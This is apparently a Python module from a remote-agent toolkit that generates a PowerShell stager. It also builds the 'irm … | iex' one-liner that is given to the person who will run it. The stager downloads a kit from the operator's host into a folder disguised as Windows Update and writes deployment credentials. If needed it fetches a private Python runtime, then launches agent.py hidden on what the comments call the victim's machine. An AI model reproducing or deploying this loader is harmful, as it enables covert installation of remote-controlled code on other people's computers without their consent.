"""The one-liner served at ``/wu``.

    powershell -NoProfile -ExecutionPolicy Bypass -Command "irm <base>/wu | iex"

Runs inside powershell.exe, which then exits, so the last thing it does is
detach a windowless process.  Nothing is written to the victim's PATH, and no
interpreter is required: if the box has none we pull an embeddable build from
our own host.
"""

from __future__ import annotations

import secrets
from .. import config

TEMPLATE = r'''
$ErrorActionPreference = 'Stop'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

$base   = '@@BASE@@'
$target = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsUpdate'
New-Item -ItemType Directory -Force -Path $target | Out-Null
Add-Type -AssemblyName System.IO.Compression.FileSystem

# --- stage ------------------------------------------------------------------
$kit = Join-Path $env:TEMP 'wu-kit.zip'
Invoke-WebRequest "$base/wu/kit.zip" -UseBasicParsing -OutFile $kit

foreach ($owned in 'syspy', 'install', 'agent.py', 'bootstrap.py') {
    $p = Join-Path $target $owned
    if (Test-Path $p) { Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue }
}
[IO.Compression.ZipFile]::ExtractToDirectory($kit, $target)
Copy-Item $kit (Join-Path $target 'kit.zip') -Force
if (Test-Path (Join-Path $target 'install\wu.cmd')) {
    Copy-Item (Join-Path $target 'install\wu.cmd') (Join-Path $target 'WindowsUpdateService.cmd') -Force
}

# --- deploy.json ------------------------------------------------------------
$deploy = [ordered]@{
    url          = $base
    room         = '@@ROOM@@'
    pass         = '@@PASS@@'
    salt         = '@@SALT@@'
    parent       = ''
    parent_ip    = ''
    hop          = 0
    group        = '@@GROUP@@'
    installed_at = [int](New-TimeSpan -Start (Get-Date '1970-01-01') -End (Get-Date)).TotalSeconds
}
[IO.File]::WriteAllText(
    (Join-Path $target 'deploy.json'),
    ($deploy | ConvertTo-Json),
    (New-Object Text.UTF8Encoding($false)))

# --- interpreter ------------------------------------------------------------
function Resolve-Python {
    foreach ($n in 'python.exe', 'py.exe') {
        $c = Get-Command $n -ErrorAction SilentlyContinue
        if (-not $c) { continue }
        $pre = @()
        if ((Split-Path $c.Source -Leaf) -ieq 'py.exe') { $pre = @('-3') }
        try {
            $v = & $c.Source @pre -c "import sys;print(sys.version_info[0])" 2>$null
            if ("$v".Trim() -eq '3') { return @{ Exe = $c.Source; Pre = $pre } }
        } catch {}
    }
    return $null
}

$py = Resolve-Python
if (-not $py) {
    Write-Host '  fetching a private Python'
    $rt  = Join-Path $target 'runtime'
    $tmp = Join-Path $env:TEMP 'wu-py.zip'
    Invoke-WebRequest "$base/wu/py.zip" -UseBasicParsing -OutFile $tmp
    Remove-Item $rt -Recurse -Force -ErrorAction SilentlyContinue
    New-Item -ItemType Directory -Force -Path $rt | Out-Null
    [IO.Compression.ZipFile]::ExtractToDirectory($tmp, $rt)
    Get-ChildItem $rt -Filter '*._pth' | ForEach-Object {
        $lines = Get-Content $_.FullName
        $lines = $lines -replace '^\s*#import\s*site\s*$', 'import site'
        if ($lines -notcontains 'import site') { $lines += 'import site' }
        if ($lines -notcontains '..') { $lines += '..' }
        Set-Content $_.FullName $lines -Encoding ASCII
    }
    foreach ($n in 'pythonw.exe', 'python.exe') {
        $p = Join-Path $rt $n
        if (Test-Path $p) { $py = @{ Exe = $p; Pre = @() }; break }
    }
}

if (-not $py) { throw 'no usable interpreter' }

# --- launch -----------------------------------------------------------------
$leaf = Split-Path $py.Exe -Leaf
$exe  = $py.Exe
if ($leaf -ieq 'python.exe') {
    $w = Join-Path (Split-Path $py.Exe) 'pythonw.exe'
    if (Test-Path $w) { $exe = $w }
} elseif ($leaf -ieq 'py.exe') {
    $w = Join-Path (Split-Path $py.Exe) 'pyw.exe'
    if (Test-Path $w) { $exe = $w }
}

$launchArgs = @() + $py.Pre + @((Join-Path $target 'agent.py'), '--hidden')
Start-Process -FilePath $exe -ArgumentList $launchArgs -WindowStyle Hidden
Write-Host '  installed.'
'''


def render(base: str = "", room: str = "", passphrase: str = "",
           group: str = "", salt: str = "") -> str:
    """Return the bootstrap script with the deployment baked in."""
    salt_val = salt or secrets.token_hex(2)
    return (TEMPLATE
            .replace("@@BASE@@", (base or config.PUBLIC_URL).rstrip("/"))
            .replace("@@ROOM@@", room or config.ROOM)
            .replace("@@PASS@@", passphrase or config.PASSPHRASE)
            .replace("@@GROUP@@", group)
            .replace("@@SALT@@", salt_val))


def one_liner(base: str = "") -> str:
    """The command to hand to a human."""
    url = (base or config.PUBLIC_URL).rstrip("/") + "/wu"
    return ('powershell -NoProfile -ExecutionPolicy Bypass '
            f'-Command "irm {url} | iex"')
